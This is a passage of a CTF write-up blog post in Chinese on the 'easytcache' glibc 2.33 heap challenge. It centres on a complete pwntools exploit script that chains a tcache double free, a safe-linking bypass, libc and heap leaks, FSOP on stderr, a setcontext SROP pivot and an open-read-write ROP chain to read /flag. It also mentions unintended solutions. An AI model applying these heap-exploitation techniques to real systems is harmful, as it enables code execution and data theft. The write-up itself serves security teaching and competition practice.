+
+
+<h3 id="解法二：通过-exit-进行FSOP构造ROP进行ORW"><a href="#解法二：通过-exit-进行FSOP构造ROP进行ORW" class="headerlink" title="解法二：通过 exit() 进行FSOP构造ROP进行ORW"></a>解法二：通过 exit() 进行FSOP构造ROP进行ORW</h3><p>考虑到<code>exit()</code>函数会调用<code>_IO_flush_all_lockp ()</code>函数，那么我们便可以劫持<code>_IO_2_1_stderr_</code>进行FSOP，控制程序执行流程</p>
+<p>由于vtable表合法性检测的存在，因此我们可以把最后一次malloc的机会用掉，以劫持vtable表</p>
+<p>笔者测试在这里如果选择直接改<code>_IO_file_jumps</code>表中的<code>__overflow</code>会触发SIGSEGV，因此考虑劫持一个合法的vtable表位，同时将stderr的vtable表劫持为该位置，接下来就可以通过<code>__overflow</code>控制程序执行流</p>
+<blockquote>
+<p>注：其实只需要vtable表位置合法即可</p>
+</blockquote>
+<p>同时我们还需要进行一次栈迁移，故考虑通过setcontext + 61上的gadget进行SROP，那么我们最初的跳转位置可以跳到这里：</p>
+<p><img src="https://i.loli.net/2021/05/06/Ws1dxZrRBTpJz72.png" alt=""></p>
+<p>我们还需要构造<code>ucontext_t</code>结构体 ，可以使用前面的那个预留的紧挨着top chunk的chunk，使用pwntools中的<code>SigreturnFrame()</code>可以快速构造该结构体，同时stderr + 8的位置需要指向该堆块</p>
+<p>最后的exp如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'DEBUG'</span></span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span class="line"></span><br><span class="line">p = process([<span class="string">'./ld-2.33.so'</span>, <span class="string">'./easytcache'</span>], env=&#123;<span class="string">'LD_PRELOAD'</span>:<span class="string">'./libc.so.6'</span>&#125;)<span class="comment">#p = remote('sec.arttnba3.cn', 10004)</span></span><br><span class="line">e = ELF(<span class="string">'./easytcache'</span>)</span><br><span class="line">libc = ELF(<span class="string">'./libc.so.6'</span>)</span><br><span class="line">one_gadget = <span class="number">0xe6e73</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span><span class="params">(choice:int)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">b"Your choice: "</span>)</span><br><span class="line">    p.sendline(str(choice).encode())</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new</span><span class="params">(size:int)</span>:</span></span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b"size?"</span>)</span><br><span class="line">    p.sendline(str(size).encode())</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index:int, content)</span>:</span></span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b"index?"</span>)</span><br><span class="line">    p.sendline(str(index).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b"content?"</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dump</span><span class="params">(index:int)</span>:</span></span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b"index?"</span>)</span><br><span class="line">    p.sendline(str(index).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b"content: "</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index:int)</span>:</span></span><br><span class="line">    cmd(<span class="number">4</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b"index?"</span>)</span><br><span class="line">    p.sendline(str(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment"># tcache double free</span></span><br><span class="line">    new(<span class="number">0x100</span>) <span class="comment"># idx0</span></span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># leak the heap base</span></span><br><span class="line">    log.info(<span class="string">"start leaking the heap base addr..."</span>)</span><br><span class="line">    edit(<span class="number">0</span>, <span class="string">b'arttnba3'</span>)</span><br><span class="line">    dump(<span class="number">0</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b'arttnba3'</span>)</span><br><span class="line">    heap_leak = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b"\x00"</span>))</span><br><span class="line">    heap_base = heap_leak - <span class="number">0x10</span></span><br><span class="line">    log.success(<span class="string">'heap base leak: '</span> + str(hex(heap_base)))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># tcache poisoning, hijack the tcache struct</span></span><br><span class="line">    edit(<span class="number">0</span>, <span class="string">b'arttnba3'</span> * <span class="number">2</span>)</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    edit(<span class="number">0</span>, p64((heap_base + <span class="number">0x10</span>) ^ ((heap_base + <span class="number">0x290</span> + <span class="number">0x11c10</span> + <span class="number">0x10</span>) &gt;&gt; <span class="number">12</span>)))</span><br><span class="line">    new(<span class="number">0x100</span>) <span class="comment"># idx1</span></span><br><span class="line">    new(<span class="number">0x100</span>) <span class="comment"># idx2, our fake chunk based on tcache manager</span></span><br><span class="line">    edit(<span class="number">2</span>, <span class="string">b'\x00\x00'</span> * <span class="number">39</span> + <span class="string">b'\x07\x00'</span>) <span class="comment"># set it full</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># leak the libc base</span></span><br><span class="line">    log.info(<span class="string">"start leaking the libc base addr..."</span>)</span><br><span class="line">    free(<span class="number">2</span>)</span><br><span class="line">    free(<span class="number">2</span>)</span><br><span class="line">    edit(<span class="number">2</span>, <span class="string">b'\x0a'</span>)</span><br><span class="line">    dump(<span class="number">2</span>)</span><br><span class="line">    main_arena = u64(p.recvuntil(<span class="string">b"\x7f"</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>, <span class="string">b"\x00"</span>)) - <span class="number">96</span> - <span class="number">0xa</span></span><br><span class="line">    __malloc_hook = main_arena - <span class="number">0x10</span></span><br><span class="line">    libc_base = __malloc_hook - libc.sym[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">    log.success(<span class="string">'libc base leak: '</span> + str(hex(libc_base)))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># construct the fake frame for setcontext</span></span><br><span class="line">    log.info(<span class="string">"start constructing the fake sigreturn frame on chunk 1..."</span>)</span><br><span class="line">    fake_frame_addr = heap_base + <span class="number">0x290</span> + <span class="number">0x11c10</span> + <span class="number">0x10</span></span><br><span class="line">    fake_frame = SigreturnFrame()</span><br><span class="line">    fake_frame[<span class="string">'uc_stack.ss_size'</span>] = libc_base + libc.sym[<span class="string">'setcontext'</span>] + <span class="number">61</span></span><br><span class="line">    fake_frame.rdi = <span class="number">0</span></span><br><span class="line">    fake_frame.rsi = libc_base + libc.sym[<span class="string">'__free_hook'</span>]</span><br><span class="line">    fake_frame.rdx = <span class="number">0x200</span></span><br><span class="line">    fake_frame.rsp = libc_base + libc.sym[<span class="string">'__free_hook'</span>]</span><br><span class="line">    fake_frame.rip = libc_base + libc.sym[<span class="string">'read'</span>]</span><br><span class="line">    edit(<span class="number">1</span>, bytes(fake_frame) + <span class="string">b"/flag\x00"</span>)</span><br><span class="line">    log.success(<span class="string">"construction complete"</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># construct the orw rop chain</span></span><br><span class="line">    log.info(<span class="string">"start constructing the orw rop chain..."</span>)</span><br><span class="line">    flag_addr = fake_frame_addr + len(bytes(fake_frame))</span><br><span class="line">    pop_rdi_ret = libc_base + libc.search(asm(<span class="string">"pop rdi ; ret"</span>)).__next__()</span><br><span class="line">    pop_rsi_ret = libc_base + libc.search(asm(<span class="string">"pop rsi ; ret"</span>)).__next__()</span><br><span class="line">    pop_rdx_ret = libc_base + libc.search(asm(<span class="string">"pop rdx ; ret"</span>)).__next__()</span><br><span class="line">    pop_rdx_pop_rbx_ret = libc_base + libc.search(asm(<span class="string">'pop rdx ; pop rbx ; ret'</span>)).__next__()</span><br><span class="line"></span><br><span class="line">    orw = <span class="string">b''</span></span><br><span class="line">    orw += p64(pop_rdi_ret) + p64(flag_addr) + p64(pop_rsi_ret) + p64(<span class="number">4</span>) + p64(libc_base + libc.sym[<span class="string">'open'</span>])</span><br><span class="line">    orw += p64(pop_rdi_ret) + p64(<span class="number">3</span>) + p64(pop_rsi_ret) + p64(flag_addr) + p64(pop_rdx_pop_rbx_ret) + p64(<span class="number">0x40</span>) + p64(<span class="number">0</span>) + p64(libc_base + libc.sym[<span class="string">'read'</span>])</span><br><span class="line">    orw += p64(pop_rdi_ret) + p64(<span class="number">1</span>) + p64(pop_rsi_ret) + p64(flag_addr) + p64(pop_rdx_pop_rbx_ret) + p64(<span class="number">0x40</span>) + p64(<span class="number">0</span>) + p64(libc_base + libc.sym[<span class="string">'write'</span>])</span><br><span class="line">    log.success(<span class="string">"construction complete"</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#construct the fake IO_FILE</span></span><br><span class="line">    log.info(<span class="string">"start constructing the fake stderr structure..."</span>)</span><br><span class="line">    fake_file = <span class="string">b""</span></span><br><span class="line">    fake_file += p64(<span class="number">0</span>) <span class="comment"># _flags, an magic number</span></span><br><span class="line">    fake_file += p64(fake_frame_addr) <span class="comment"># _IO_read_ptr</span></span><br><span class="line">    fake_file += p64(<span class="number">0</span>) <span class="comment"># _IO_read_end</span></span><br><span class="line">    fake_file += p64(<span class="number">0</span>) <span class="comment"># _IO_read_base</span></span><br><span class="line">    fake_file += p64(<span class="number">0</span>) <span class="comment"># _IO_write_base</span></span><br><span class="line">    fake_file += <span class="string">b"arttnba3"</span> <span class="comment"># _IO_write_ptr</span></span><br><span class="line">    fake_file += p64(<span class="number">0</span>) <span class="comment"># _IO_write_end</span></span><br><span class="line">    fake_file += p64(<span class="number">0</span>) <span class="comment"># _IO_buf_base;</span></span><br><span class="line">    fake_file += p64(<span class="number">0</span>) <span class="comment"># _IO_buf_end should usually be (_IO_buf_base + 1)</span></span><br><span class="line">    fake_file += p64(<span class="number">0</span>) * <span class="number">4</span> <span class="comment"># from _IO_save_base to _markers</span></span><br><span class="line">    fake_file += p64(libc_base + libc.sym[<span class="string">'_IO_2_1_stdout_'</span>]) <span class="comment"># the FILE chain ptr</span></span><br><span class="line">    fake_file += p32(<span class="number">2</span>) <span class="comment"># _fileno for stderr is 2</span></span><br><span class="line">    fake_file += p32(<span class="number">0</span>) <span class="comment"># _flags2, usually 0</span></span><br><span class="line">    fake_file += p64(<span class="number">0xFFFFFFFFFFFFFFFF</span>) <span class="comment"># _old_offset, -1</span></span><br><span class="line">    fake_file += p16(<span class="number">0</span>) <span class="comment"># _cur_column</span></span><br><span class="line">    fake_file += <span class="string">b"\x00"</span> <span class="comment"># _vtable_offset</span></span><br><span class="line">    fake_file += <span class="string">b"\n"</span> <span class="comment"># _shortbuf[1]</span></span><br><span class="line">    fake_file += p32(<span class="number">0</span>) <span class="comment"># padding</span></span><br><span class="line">    fake_file += p64(libc_base + libc.sym[<span class="string">'_IO_2_1_stderr_'</span>] + <span class="number">0x1ef0</span>) <span class="comment"># _IO_stdfile_2_lock</span></span><br><span class="line">    fake_file += p64(<span class="number">0xFFFFFFFFFFFFFFFF</span>) <span class="comment"># _offset, -1</span></span><br><span class="line">    fake_file += p64(<span class="number">0</span>) <span class="comment"># _codecvt, usually 0</span></span><br><span class="line">    fake_file += p64(libc_base + libc.sym[<span class="string">'_IO_2_1_stderr_'</span>] - <span class="number">0xe40</span>) <span class="comment"># _IO_wide_data_2</span></span><br><span class="line">    fake_file += p64(<span class="number">0</span>) * <span class="number">3</span> <span class="comment"># from _freeres_list to __pad5</span></span><br><span class="line">    fake_file += p32(<span class="number">0xFFFFFFFF</span>) <span class="comment"># _mode, usually -1</span></span><br><span class="line">    fake_file += <span class="string">b"\x00"</span> * <span class="number">19</span> <span class="comment"># _unused2</span></span><br><span class="line">    fake_file = fake_file.ljust(<span class="number">0xD8</span>,<span class="string">b'\x00'</span>) <span class="comment"># adjust to vtable</span></span><br><span class="line">    fake_file += p64(libc_base + <span class="number">0x1e2550</span>) <span class="comment"># unable to hijack to _IO_file_jumps directly, so we choose a location nearby</span></span><br><span class="line">    log.success(<span class="string">"construction complete"</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># tcache poisoning</span></span><br><span class="line">    log.info(<span class="string">"start tcache poisoning..."</span>)</span><br><span class="line">    edit(<span class="number">2</span>, <span class="string">b"\x07\x00"</span> * <span class="number">64</span> + p64(<span class="number">0</span>) * <span class="number">15</span> + p64(libc_base + libc.sym[<span class="string">'_IO_2_1_stderr_'</span>]))</span><br><span class="line">    new(<span class="number">0x100</span>) <span class="comment"># idx 4, our fake chunk based on _IO_2_1_stderr_</span></span><br><span class="line">    edit(<span class="number">3</span>, fake_file)</span><br><span class="line">    edit(<span class="number">2</span>, <span class="string">b"\x07\x00"</span> * <span class="number">64</span> + p64(<span class="number">0</span>) * <span class="number">15</span> + p64(libc_base + <span class="number">0x1e2550</span> + <span class="number">0x10</span>))</span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    new(<span class="number">0x100</span>) <span class="comment"># idx 5, our fake chunk base on fake __overflow</span></span><br><span class="line">    edit(<span class="number">4</span>, p64(libc_base + <span class="number">0x14A0A0</span>) * <span class="number">2</span>)</span><br><span class="line">    log.success(<span class="string">"tcache poisoning complete"</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># get the flag</span></span><br><span class="line">    log.info(<span class="string">"start sending the orw rop chain..."</span>)</span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    cmd(<span class="number">5</span>)</span><br><span class="line">    sleep(<span class="number">1</span>)</span><br><span class="line">    p.sendline(orw)</span><br><span class="line">    log.success(<span class="string">"orw rop chain has been sent"</span>)</span><br><span class="line">    log.info(<span class="string">"start getting the flag..."</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b"THERE'S NO DOUBT THAT YOU ARE THINKING ABOUT PEACH!\n"</span>)</span><br><span class="line">    log.success(<span class="string">"flag received: "</span>)</span><br><span class="line">    print(p.recvuntil(<span class="string">b'&#125;'</span>).decode())</span><br><span class="line">    p.recv()</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    exp()</span><br></pre></td></tr></table></figure>
+
+<h3 id="非预期："><a href="#非预期：" class="headerlink" title="非预期："></a>非预期：</h3><p>影二つ师傅， 本场比赛中唯一的解：</p>
+<p><img src="https://i.loli.net/2021/05/15/9GLfiSZnR6e4Xvp.png" alt="image.png"></p>
+<p><img src="https://i.loli.net/2021/05/15/LQfOiMuyn24WktF.png" alt="image.png"></p>
+<p>笔者暂时还没复现过这个非预期，不过不得不说这确实是一个不错的思路</p>
+<h3 id="非预期二："><a href="#非预期二：" class="headerlink" title="非预期二："></a>非预期二：</h3><p><a href="https://www.anquanke.com/post/id/235598#h3-4" target="_blank" rel="noopener">House of Kiwi</a>，由fmyy师傅提供的走FSOP解法</p>
+<p><img src="https://p3.ssl.qhimg.com/t016933e48a0f026951.jpg" alt="image.png"></p>
+<p>以上两种非预期解法都只需要使用一次任意地址写（<del>懂了，明年把malloc次数减少一次</del>）</p>
+
+    </div>
+
+    
+    
+    
+        
+
+  <div class="followme">
+    <p>Welcome to my other publishing channels</p>
+
+    <div class="social-list">
+
+        <div class="social-item">
+          <a target="_blank" class="social-link" href="https://twitter.com/arttnba3">
+            <span class="icon">
+              <i class="fab fa-twitter"></i>
+            </span>
+
+            <span class="label">Twitter</span>
+          </a>
+        </div>
+
+        <div class="social-item">
+          <a target="_blank" class="social-link" href="/atom.xml">
+            <span class="icon">
+              <i class="fa fa-rss"></i>
+            </span>
+
+            <span class="label">RSS</span>
+          </a>
+        </div>
+    </div>
+  </div>
+
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/" rel="tag"># 信息安全</a>
+              <a href="/tags/PWN/" rel="tag"># PWN</a>
+              <a href="/tags/%E5%A0%86/" rel="tag"># 堆</a>
+              <a href="/tags/ROP/" rel="tag"># ROP</a>
+              <a href="/tags/CTF/" rel="tag"># CTF</a>
+              <a href="/tags/python/" rel="tag"># python</a>
+              <a href="/tags/UAF/" rel="tag"># UAF</a>
+              <a href="/tags/%E6%A0%BC%E5%BC%8F%E5%AD%97%E7%AC%A6%E4%B8%B2/" rel="tag"># 格式字符串</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2021/02/24/%E3%80%90CTF%E8%B5%84%E6%96%99-0x0002%E3%80%91%E7%AE%80%E6%98%93Linux%E5%A0%86%E5%88%A9%E7%94%A8%E5%85%A5%E9%97%A8%E6%95%99%E7%A8%8Bby%20arttnba3/" rel="prev" title="【CTF资料-0x0002】简易Linux堆利用入门教程by arttnba3">
+      <i class="fa fa-chevron-left"></i> 【CTF资料-0x0002】简易Linux堆利用入门教程by arttnba3
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+    <div class="comments" id="gitalk-container"></div>
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#0x00-绪论"><span class="nav-number">1.</span> <span class="nav-text">0x00.绪论</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x01-Baby-Repeater-fmtstr-got-hijack"><span class="nav-number">2.</span> <span class="nav-text">0x01.Baby Repeater - fmtstr + got hijack</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#解题思路"><span class="nav-number">2.1.</span> <span class="nav-text">解题思路</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x02-easytcache-Use-After-Free-safe-linking-bypass-ORW-（-FSOP）"><span class="nav-number">3.</span> <span class="nav-text">0x02. easytcache - Use After Free + safe-linking bypass + ORW （+ FSOP）</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#程序分析"><span class="nav-number">3.1.</span> <span class="nav-text">程序分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#解题思路-1"><span class="nav-number">3.2.</span> <span class="nav-text">解题思路</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#解法一：-environ泄露栈地址在栈上构造ROP进行ORW"><span class="nav-number">3.2.1.</span> <span class="nav-text">解法一：__environ泄露栈地址在栈上构造ROP进行ORW</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#解法二：通过-exit-进行FSOP构造ROP进行ORW"><span class="nav-number">3.2.2.</span> <span class="nav-text">解法二：通过 exit() 进行FSOP构造ROP进行ORW</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#非预期："><span class="nav-number">3.2.3.</span> <span class="nav-text">非预期：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#非预期二："><span class="nav-number">3.2.4.</span> <span class="nav-text">非预期二：</span></a></li></ol></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="arttnba3"
+      src="/images/avatar.png">
+  <p class="site-author-name" itemprop="name">arttnba3</p>
+  <div class="site-description" itemprop="description">- 做了关于你的梦，所以不愿醒来呢 -</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">25</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">53</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/arttnba3" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;arttnba3" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:1543127579@qq.com" title="E-Mail → mailto:1543127579@qq.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://weibo.com/u/7518681149" title="Weibo → https:&#x2F;&#x2F;weibo.com&#x2F;u&#x2F;7518681149" rel="noopener" target="_blank"><i class="fab fa-weibo fa-fw"></i>Weibo</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://twitter.com/arttnba3" title="Twitter → https:&#x2F;&#x2F;twitter.com&#x2F;arttnba3" rel="noopener" target="_blank"><i class="fab fa-twitter fa-fw"></i>Twitter</a>
+      </span>
+  </div>
+
+
+  <div class="links-of-blogroll motion-element">
+    <div class="links-of-blogroll-title"><i class="fa fa-link fa-fw"></i>
+      Friends' Links
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="https://www.wootec.top/" title="https:&#x2F;&#x2F;www.wootec.top" rel="noopener" target="_blank">Reverier</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://luoq1an.github.io/" title="https:&#x2F;&#x2F;luoq1an.github.io" rel="noopener" target="_blank">luoqian</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://ll1ng.github.io/" title="https:&#x2F;&#x2F;ll1ng.github.io" rel="noopener" target="_blank">ling</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://shal10w.github.io/" title="https:&#x2F;&#x2F;shal10w.github.io" rel="noopener" target="_blank">shallow</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://eqqie.cn/" title="https:&#x2F;&#x2F;eqqie.cn" rel="noopener" target="_blank">eqqie</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://cor1e.cn/" title="https:&#x2F;&#x2F;cor1e.cn" rel="noopener" target="_blank">cor1e</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://yunq1ao.com/" title="https:&#x2F;&#x2F;yunq1ao.com" rel="noopener" target="_blank">yunqiao</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://mercer5.github.io/" title="https:&#x2F;&#x2F;mercer5.github.io" rel="noopener" target="_blank">mercer</a>
+        </li>
+    </ul>
+  </div>
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">arttnba3</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a>
+  </div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="Total Visitors">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="Total Views">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+  <script>
+    (function(){
+      var canonicalURL, curProtocol;
+      //Get the <link> tag
+      var x=document.getElementsByTagName("link");
+		//Find the last canonical URL
+		if(x.length > 0){
+			for (i=0;i<x.length;i++){
+				if(x[i].rel.toLowerCase() == 'canonical' && x[i].href){
+					canonicalURL=x[i].href;
